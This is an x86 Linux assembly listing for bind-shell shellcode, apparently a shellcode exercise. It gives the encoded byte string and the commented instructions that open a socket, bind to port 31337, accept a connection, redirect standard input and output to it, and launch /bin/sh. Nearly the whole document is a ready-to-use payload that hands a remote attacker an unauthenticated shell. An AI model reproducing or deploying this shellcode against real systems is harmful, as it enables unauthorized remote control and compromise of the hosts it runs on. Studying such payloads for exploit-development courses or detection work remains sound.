BITS 32
  ; 85 bytes long
  ; "\x6a\x66\x58\x99\x31\xdb\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\x43\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\x53\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x03\x59\xb0\x3f\x49\xcd\x80\x75\xf9\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
  
  push BYTE 0x66
  pop eax
  cdq
  xor ebx, ebx
  inc ebx
  push edx      ; protocol = 0x0
  push ebx      ; socket_type = 0x1 (SOCK_STREAM)
  push BYTE 0x2 ; socket_family = 0x2 (AF_INET)
  mov ecx, esp
  int 0x80

  xchg esi, eax ; save socket fd

  ; bind
  push BYTE 0x66
  pop eax
  inc ebx
  push edx
  push WORD 0x697a  ; default port = 31337 
  push WORD bx      ; in_family = 0x2 (AF_INET) 
  mov ecx, esp
  push BYTE 16      ; size of struct sockaddr_in
  push ecx          ; pointer to the structure
  push esi          ; saved esi
  mov ecx, esp
  int 0x80

  ; listen
  mov BYTE al, 0x66     ; eax is 0 if bind was executed correctly
  shl ebx, 1            ; ebx is 2 -> 0010 , shl shift 1 bit to left, so ebx will be 0100, or 4 in decimal
  push ebx              ; listen to 4 clients
  push esi              ; sock fd to listen
  mov ecx, esp
  int 0x80

  ; accept a connection
  mov BYTE al, 0x66
  inc ebx           ; ebx = 5 = accept() call
  push edx          ; socklen = 0
  push edx          ; sockaddr_ptr = NULL
  push esi          ; socket fd which will accept connections
  mov ecx, esp
  int 0x80


  ; dup2, change stdin|stdout|stderr to socket file descriptor
  xchg ebx, eax   ; ebx -> peer socket fd | eax -> 5
  push BYTE 0x3
  pop ecx
dup2loop:
  mov BYTE al, 0x3f
  dec ecx
  int 0x80
  jnz dup2loop

  ; execute a shell
  ; ecx = 0
  ; edx = 0
  mov al, 11
  push ecx
  push 0x68732f2f
  push 0x6e69622f
  mov ebx, esp
  int 0x80
